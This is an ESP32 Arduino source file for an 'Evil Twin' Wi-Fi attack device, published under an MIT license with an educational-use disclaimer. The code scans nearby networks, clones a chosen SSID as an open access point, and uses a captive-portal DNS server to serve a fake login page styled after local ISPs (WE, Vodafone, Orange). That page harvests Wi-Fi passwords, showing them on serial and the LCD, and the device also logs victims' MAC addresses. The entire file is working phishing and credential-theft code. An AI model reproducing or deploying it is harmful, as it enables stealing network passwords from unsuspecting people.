/*
====================================================
Copyright (c) 2025 Moamen Tarek El Sherbiny

Author: Moamen Tarek El Sherbiy
Project: Evil Twin Attack

* Licensed under the MIT License.
* This project is intended for educational and authorized security testing purposes only.
* Any use of this project for attacking networks or systems without explicit permission from the owner is strictly prohibited.
* The author assumes no responsibility or liability for any misuse, damage, or illegal activity resulting from the use of this code.
* ⚠️ Any misuse of this project is the sole responsibility of the user.
* You may use, copy, modify, and distribute this code as long as you include this copyright notice.

====================================================
*/

#include <Wire.h> 
#include <LiquidCrystal_I2C.h>
#include <WiFi.h>
#include <WebServer.h> 
#include <DNSServer.h>   

// --- 1. Define buttons and LED ---
#define BUTTON_UP_PIN     25
#define BUTTON_DOWN_PIN   26
#define BUTTON_SELECT_PIN 27
#define LED_PIN           2  // built-in blue LED

// --- LCD settings ---
LiquidCrystal_I2C lcd(0x27, 16, 2); 

// --- Server settings ---
DNSServer dnsServer;
WebServer server(80); 
const IPAddress apIP(192, 168, 4, 1); 

// --- 2. Menu and network variables ---

// Structure to store name, signal strength, and encryption type
struct WiFiNetwork { 
  String ssid;
  long rssi;
  String encryptionType; 
};

#define MAX_NETWORKS 20 
WiFiNetwork foundNetworks[MAX_NETWORKS]; 

String targetSSID = "";        
bool targetSelected = false;   
bool showingTempMessage = false;
int networkCount = 0;          
int selectedNetworkIndex = 0;  

// --- Indicator LED variables ---
unsigned long lastLedBlinkTime = 0;
bool ledState = LOW;

// --- MAC Address variables ---
bool newClientFlag = false; 
String newClientMAC = "";   

// --- 3. "Return to menu" variable ---
unsigned long selectPressStartTime = 0; // to calculate long press

// -------------------------------------------------------------------
// (Function 1: "Smart" web page)
// -------------------------------------------------------------------
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><title>WiFi Connection</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  
  String headerText = "Network Connection Required";
  String brandColor = "#0275d8"; 
  String ssidLower = targetSSID;
  ssidLower.toLowerCase();

  if (ssidLower.indexOf("we") != -1) {
    headerText = "WE Network Login";
    brandColor = "#800080"; 
  } else if (ssidLower.indexOf("vodafone") != -1) {
    headerText = "Vodafone WiFi";
    brandColor = "#E60000"; 
  } else if (ssidLower.indexOf("orange") != -1) {
    headerText = "Orange WiFi Login";
    brandColor = "#FF6600"; 
  }
  
  html += "<style>body{text-align:center; font-family:sans-serif; background-color:#f0f0f0; padding: 20px;}";
  html += "h2{color:" + brandColor + ";} form{background-color:#fff; border-radius:8px; padding:20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);}";
  html += "input[type=text], input[type=password]{width:80%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;}";
  html += "input[type=submit]{background-color:" + brandColor + "; color:white; padding:14px 20px; border:none; border-radius:4px; cursor:pointer; width:85%;}"; 
  html += "</style>";
  html += "</head><body>";
  html += "<h2>" + headerText + "</h2>"; 
  html += "<p>Please enter your data below to connect:</p>";
  html += "<form method='POST' action='/submit'>"; 
  html += "<input type='text' name='user_input' placeholder='Enter password...' required><br>";
  html += "<input type='submit' value='Connect'>";
  html += "</form>";
  html += "</body></html>";
  server.send(200, "text/html", html); 
}

// -------------------------------------------------------------------
// (Function 2: Data reception)
// -------------------------------------------------------------------
void handleSubmit() {
  String input_data = "";
  if (server.hasArg("user_input")) {
    input_data = server.arg("user_input");
    
    Serial.println("==========================================");
    Serial.print("--- DATA RECEIVED (TARGET: ");
    Serial.print(targetSSID);
    Serial.println(") ---");
    Serial.print("Data: ");
    Serial.println(input_data); 
    Serial.println("==========================================");
    
    showingTempMessage = true;
    for (int i=0; i<5; i++) { 
        digitalWrite(LED_PIN, LOW);
        delay(100);
        digitalWrite(LED_PIN, HIGH);
        delay(100);
    }
    
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Data Captured!");
    lcd.setCursor(0, 1);
    lcd.print(input_data.substring(0, 16)); 
    delay(5000); 
    showingTempMessage = false; 
    
    String response = "<h1>Connection Successful!</h1><p>You can now close this window.</p>";
    server.send(200, "text/html", response);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}

// -------------------------------------------------------------------
// (Function 3: Scan and store networks)
// -------------------------------------------------------------------
void scanAndStoreNetworks() {
  lcd.clear();
  lcd.print("Scanning...");
  
  for (int i=0; i<10; i++) { 
      digitalWrite(LED_PIN, HIGH);
      delay(50);
      digitalWrite(LED_PIN, LOW);
      delay(50);
  }

  WiFi.mode(WIFI_STA); 
  WiFi.disconnect();
  delay(100);

  networkCount = WiFi.scanNetworks(); 
  
  if (networkCount == 0) {
    lcd.clear();
    lcd.print("No Networks");
    delay(2000);
  } else {
    lcd.clear();
    lcd.print(networkCount);
    lcd.print(" Networks Found");
    delay(1000);
    
    networkCount = min(networkCount, MAX_NETWORKS); 
    for (int i = 0; i < networkCount; ++i) {
      foundNetworks[i].ssid = WiFi.SSID(i); 
      foundNetworks[i].rssi = WiFi.RSSI(i);
      switch (WiFi.encryptionType(i)) {
        case WIFI_AUTH_OPEN:          foundNetworks[i].encryptionType = "OPEN";   break;
        case WIFI_AUTH_WEP:           foundNetworks[i].encryptionType = "WEP";    break;
        case WIFI_AUTH_WPA_PSK:       foundNetworks[i].encryptionType = "WPA";    break;
        case WIFI_AUTH_WPA2_PSK:      foundNetworks[i].encryptionType = "WPA2";   break;
        case WIFI_AUTH_WPA_WPA2_PSK:  foundNetworks[i].encryptionType = "WPA/2";  break;
        case WIFI_AUTH_WPA3_PSK:      foundNetworks[i].encryptionType = "WPA3";   break;
        case WIFI_AUTH_WPA2_WPA3_PSK: foundNetworks[i].encryptionType = "WPA2/3"; break;
        default:                      foundNetworks[i].encryptionType = "???";    break;
      }
    }
  }
}

// -------------------------------------------------------------------
// (Function 4: WiFi event listener)
// -------------------------------------------------------------------
void WiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info){
  if (event == WIFI_EVENT_AP_STACONNECTED) { 
    uint8_t* mac = info.wifi_ap_staconnected.mac; 
    char macStr[13];
    sprintf(macStr, "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    newClientMAC = String(macStr); 
    newClientFlag = true; 
  }
}

// -------------------------------------------------------------------
// (Function 5: Start evil twin)
// -------------------------------------------------------------------
void startEvilTwin() {
  lcd.clear();
  lcd.print("Starting AP...");
  lcd.setCursor(0, 1);
  lcd.print(targetSSID.substring(0, 16));
  
  digitalWrite(LED_PIN, HIGH); 
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(targetSSID.c_str(), ""); 
  WiFi.onEvent(WiFiEvent); 

  dnsServer.start(53, "*", apIP); 
  server.on("/", HTTP_GET, handleRoot);     
  server.on("/submit", HTTP_POST, handleSubmit); 
  server.onNotFound(handleRoot);         
  server.begin(); 
  
  lcd.clear(); 
}

// -------------------------------------------------------------------
// (Function 6: Display menu on LCD)
// -------------------------------------------------------------------
void displayMenu() {
  lcd.clear();
  
  lcd.setCursor(0, 0);
  lcd.print(">"); 
  lcd.print(foundNetworks[selectedNetworkIndex].ssid.substring(0, 15)); 

  String encType = foundNetworks[selectedNetworkIndex].encryptionType;
  while(encType.length() < 6) encType += " "; 
  String rssi = "RSSI: " + String(foundNetworks[selectedNetworkIndex].rssi);
  lcd.setCursor(0, 1);
  lcd.print(encType); 
  lcd.print(" ");      
  lcd.print(rssi);     
}

// -------------------------------------------------------------------
// (Main setup function)
// -------------------------------------------------------------------
void setup() {
  Serial.begin(115200); 
  Wire.begin(21, 22); 
  lcd.init(); 
  lcd.backlight();
  lcd.clear();
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT); 
  
  scanAndStoreNetworks(); 
  
  if (networkCount > 0) {
    displayMenu();
  }
}

// -------------------------------------------------------------------
// (Infinite loop)
// -------------------------------------------------------------------
unsigned long lastLcdUpdateTime = 0; 
unsigned long buttonPressTime = 0; 

void loop() {
  
  // --- Part 1: Menu mode ---
  if (!targetSelected) {
    
    if (millis() - lastLedBlinkTime > 700) { 
        lastLedBlinkTime = millis();
        ledState = !ledState;
        digitalWrite(LED_PIN, ledState); 
    }
    
    if (networkCount == 0) {
      scanAndStoreNetworks();
      if (networkCount > 0) displayMenu();
      delay(1000);
      return; 
    }
    
    if (millis() - buttonPressTime > 250) { 
      if (digitalRead(BUTTON_DOWN_PIN) == LOW) { 
        buttonPressTime = millis();
        selectedNetworkIndex++; 
        if (selectedNetworkIndex >= networkCount) {
          selectedNetworkIndex = 0;
        }
        displayMenu(); 
      } 
      else if (digitalRead(BUTTON_UP_PIN) == LOW) { 
        buttonPressTime = millis();
        selectedNetworkIndex--; 
        if (selectedNetworkIndex < 0) {
          selectedNetworkIndex = networkCount - 1;
        }
        displayMenu(); 
      } 
      else if (digitalRead(BUTTON_SELECT_PIN) == LOW) { 
        buttonPressTime = millis();
        targetSSID = foundNetworks[selectedNetworkIndex].ssid; 
        targetSelected = true; 
        startEvilTwin(); 
      }
    }
  } 
  
  // --- Part 2: Attack mode ---
  else {
    dnsServer.processNextRequest(); 
    server.handleClient(); 

    // --- 4. New modification: "Return to menu" (Soft Reset) ---
    // (Check if "select" button is pressed)
    if (digitalRead(BUTTON_SELECT_PIN) == LOW) {
      if (selectPressStartTime == 0) { // if first press
        selectPressStartTime = millis(); // start counting
      } else if (millis() - selectPressStartTime > 3000 && !showingTempMessage) { // if held 3 sec
        // --- Execute return ---
        targetSelected = false; // back to menu mode
        showingTempMessage = false;
        newClientFlag = false;
        selectPressStartTime = 0; // reset counter
        
        server.stop(); // stop servers
        dnsServer.stop();
        WiFi.onEvent(nullptr); // detach event listener
        WiFi.softAPdisconnect(true); // close fake AP
        WiFi.mode(WIFI_STA); // return to station mode
        
        digitalWrite(LED_PIN, LOW); // turn off solid LED
        
        displayMenu(); // display menu again
        return; // exit this loop iteration
      }
    } else {
      selectPressStartTime = 0; // reset counter if released
    }
    // --- End of "Return to menu" code ---


    if (newClientFlag) {
      newClientFlag = false; 
      showingTempMessage = true; 
      
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("New Client!");
      lcd.setCursor(0, 1);
      lcd.print("MAC:");
      lcd.print(newClientMAC); 
      
      delay(4000); 
      showingTempMessage = false; 
    }

    if (millis() - lastLcdUpdateTime > 1000 && !showingTempMessage) {
      lastLcdUpdateTime = millis();
      int clients = WiFi.softAPgetStationNum(); 
      
      lcd.setCursor(0, 0);
      lcd.print("                ");
      lcd.setCursor(0, 0);
      lcd.print("WiFi:"); 
      lcd.print(targetSSID.substring(0, 10)); 
      
      lcd.setCursor(0, 1);
      lcd.print("Clients: [ ]    "); 
      lcd.setCursor(0, 1);
      lcd.print("Clients: [");
      lcd.print(clients);
      lcd.print("]");
    }
  }
}
